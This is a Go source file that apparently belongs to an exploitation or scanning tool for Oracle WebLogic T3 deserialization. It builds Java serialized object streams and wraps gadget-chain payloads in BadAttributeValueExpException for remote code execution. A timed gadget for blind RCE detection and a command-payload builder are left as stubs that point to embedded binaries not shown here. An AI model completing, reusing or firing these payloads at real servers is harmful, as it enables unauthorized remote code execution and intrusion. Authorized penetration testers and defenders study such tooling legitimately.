package weblogic

import (
	"encoding/binary"
	"fmt"
)

// Java serialization stream constants
const (
	STREAM_MAGIC   = 0xaced
	STREAM_VERSION = 5

	TC_NULL           = 0x70
	TC_REFERENCE      = 0x71
	TC_CLASSDESC      = 0x72
	TC_OBJECT         = 0x73
	TC_STRING         = 0x74
	TC_ARRAY          = 0x75
	TC_CLASS          = 0x76
	TC_BLOCKDATA      = 0x77
	TC_ENDBLOCKDATA   = 0x78
	TC_RESET          = 0x79
	TC_BLOCKDATALONG  = 0x7a
	TC_EXCEPTION      = 0x7b
	TC_LONGSTRING     = 0x7c
	TC_PROXYCLASSDESC = 0x7d
	TC_ENUM           = 0x7e

	SC_WRITE_METHOD   = 0x01
	SC_SERIALIZABLE   = 0x02
	SC_EXTERNALIZABLE = 0x04
	SC_ENUM           = 0x10

	baseWireHandle = 0x7e0000
)

// JavaWriter builds Java serialized object streams
type JavaWriter struct {
	buf        []byte
	handles    map[string]uint32 // class/string → handle
	nextHandle uint32
}

func NewJavaWriter() *JavaWriter {
	return &JavaWriter{
		buf:        make([]byte, 0),
		handles:    make(map[string]uint32),
		nextHandle: baseWireHandle,
	}
}

func (w *JavaWriter) WriteStreamHeader() {
	w.WriteUint16(STREAM_MAGIC)
	w.WriteUint16(STREAM_VERSION)
}

func (w *JavaWriter) WriteUint8(b byte) {
	w.buf = append(w.buf, b)
}

func (w *JavaWriter) WriteUint16(v uint16) {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, v)
	w.buf = append(w.buf, b...)
}

func (w *JavaWriter) WriteUint32(v uint32) {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, v)
	w.buf = append(w.buf, b...)
}

func (w *JavaWriter) WriteBytes(b []byte) {
	w.buf = append(w.buf, b...)
}

func (w *JavaWriter) WriteString(s string) {
	w.WriteUint8(TC_STRING)
	w.WriteUint16(uint16(len(s)))
	w.WriteBytes([]byte(s))
}

func (w *JavaWriter) WriteNull() {
	w.WriteUint8(TC_NULL)
}

func (w *JavaWriter) WriteReference(handle uint32) {
	w.WriteUint8(TC_REFERENCE)
	w.WriteUint32(handle)
}

// ClassDesc writes a class descriptor and returns its handle
func (w *JavaWriter) ClassDesc(name string, svuid uint64, flags byte, fields []FieldDesc) uint32 {
	key := "cd:" + name
	if h, ok := w.handles[key]; ok {
		w.WriteReference(h)
		return h
	}

	w.WriteUint8(TC_CLASSDESC)
	w.WriteString(name)
	// serialVersionUID
	uid := make([]byte, 8)
	binary.BigEndian.PutUint64(uid, svuid)
	w.WriteBytes(uid)
	w.WriteUint8(flags)
	w.WriteUint16(uint16(len(fields)))

	for _, f := range fields {
		w.WriteUint8(byte(f.Type))
		w.WriteString(f.Name)
		if f.Type == 'L' || f.Type == '[' {
			// type string
			if existing, ok := w.handles["ts:"+f.TypeStr]; ok {
				w.WriteReference(existing)
			} else {
				h := w.nextHandle
				w.nextHandle += 1
				w.handles["ts:"+f.TypeStr] = h
				w.WriteString(f.TypeStr)
			}
		}
	}

	w.WriteUint8(TC_ENDBLOCKDATA)
	w.WriteNull() // no superclass desc

	h := w.nextHandle
	w.nextHandle += 1
	w.handles[key] = h
	return h
}

// FieldDesc describes a class field
type FieldDesc struct {
	Type    byte // 'I','Z','L','[', etc.
	Name    string
	TypeStr string // for L/[ types
}

// Object writes an object with the given class handle and field data
func (w *JavaWriter) Object(classHandle uint32, fieldsData []byte) {
	w.WriteUint8(TC_OBJECT)
	w.WriteReference(classHandle)
	w.WriteBytes(fieldsData)
}

// BlockData writes block data
func (w *JavaWriter) BlockData(data []byte) {
	if len(data) < 256 {
		w.WriteUint8(TC_BLOCKDATA)
		w.WriteUint8(byte(len(data)))
	} else {
		w.WriteUint8(TC_BLOCKDATALONG)
		w.WriteUint32(uint32(len(data)))
	}
	w.WriteBytes(data)
}

func (w *JavaWriter) Bytes() []byte {
	return w.buf
}

// BuildBadAttrValueExp builds a BadAttributeValueExpException wrapping the given inner payload
// This is the standard WebLogic T3 outer wrapper
func BuildBadAttrValueExp(innerPayload []byte) []byte {
	w := NewJavaWriter()
	w.WriteStreamHeader()

	// BadAttributeValueExpException class desc
	// serialVersionUID: d4e7daab632d4640
	badAttrUID := uint64(0xd4e7daab632d4640)
	h := w.ClassDesc("javax.management.BadAttributeValueExpException", badAttrUID, SC_SERIALIZABLE,
		[]FieldDesc{
			{'L', "val", "Ljava/lang/Object;"},
		})

	// The object itself
	w.WriteUint8(TC_OBJECT)
	w.WriteReference(h)

	// val field = inner payload (the gadget chain)
	w.WriteBytes(innerPayload)

	return w.Bytes()
}

// BuildTimedGadget builds a simple timed gadget for blind detection
// Uses Thread.sleep(5000) - if connection hangs, RCE succeeded
func BuildTimedGadget() []byte {
	// This is a placeholder - real gadget requires commons-collections on target
	// For now, return the raw serialized stream
	w := NewJavaWriter()
	w.WriteStreamHeader()

	// Simple HashMap with a constant - won't trigger RCE but validates deserialization
	w.WriteNull()

	return w.Bytes()
}

// BuildCmdPayload builds a complete T3 payload from a command string
// Returns the raw Java serialized object (to be wrapped in T3 envelope)
func BuildCmdPayload(cmd string) []byte {
	// For WebLogic T3, we need a valid gadget chain.
	// The embedded binary payloads already contain the full gadget.
	// This function provides a Go-native builder for future use.

	// TODO: Implement native CommonsBeanutils1 / CommonsCollections gadget
	// For now, return empty - use embedded binaries
	_ = cmd
	return nil
}

// String returns hex dump for debugging
func (w *JavaWriter) String() string {
	return fmt.Sprintf("JavaWriter: %d bytes, %d handles", len(w.buf), len(w.handles))
}
